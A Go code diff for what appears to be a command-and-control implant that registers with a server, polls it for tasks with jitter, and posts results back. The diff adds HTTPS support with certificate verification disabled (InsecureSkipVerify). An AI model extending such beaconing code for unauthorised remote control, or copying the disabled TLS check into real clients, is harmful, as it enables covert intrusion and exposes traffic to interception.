@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"math/rand/v2"
@@ -21,6 +22,7 @@ type Agent struct {
 	Jitter           int
 	Debug            bool
 	Client           *http.Client
+	Https            bool
 }
 
 type Task struct {
@@ -34,6 +36,13 @@ type Result struct {
 	AgentID string `json:"agent_id"`
 	TaskID  string `json:"task_id"`
 	Result  string `json:"result"`
+}
+
+func (agent *Agent) scheme() string {
+	if agent.Https {
+		return "https"
+	}
+	return "http"
 }
 
 func getLocalIP() string {
@@ -70,6 +79,11 @@ func getLocalIP() string {
 }
 
 func (agent *Agent) Register() error {
+	if agent.Https {
+		agent.Client.Transport = &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		}
+	}
 	data := map[string]string{
 		"agent_id":     agent.LocalIP,
 		"os":           runtime.GOOS,
@@ -79,7 +93,7 @@ func (agent *Agent) Register() error {
 	if err != nil {
 		return fmt.Errorf("failed to marshal JSON: %w", err)
 	}
-	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/register", agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
+	req, err := http.NewRequest("POST", fmt.Sprintf("%s://%s:%d/register", agent.scheme(), agent.ServerIP, agent.ServerPort), bytes.NewBuffer(jsonData))
 	if err != nil {
 		return fmt.Errorf("failed to create request: %w", err)
 	}
@@ -165,7 +179,7 @@ func main() {
 
 	// Main loop to poll server for tasks
 	for {
-		url := fmt.Sprintf("http://%s:%d/tasks", agent.ServerIP, agent.ServerPort)
+		url := fmt.Sprintf("%s://%s:%d/tasks", agent.scheme(), agent.ServerIP, agent.ServerPort)
 		ip_json := map[string]string{"agent_id": agent.LocalIP}
 		jsonData, err := json.Marshal(ip_json)
 		if err != nil {
@@ -224,7 +238,7 @@ func main() {
 			continue
 		}
 		// Send the result back to the server
-		url = fmt.Sprintf("http://%s:%d/results", agent.ServerIP, agent.ServerPort)
+		url = fmt.Sprintf("%s://%s:%d/results", agent.scheme(), agent.ServerIP, agent.ServerPort)
 		jsonData, err = json.Marshal(result)
 		if err != nil {
 			if agent.Debug {
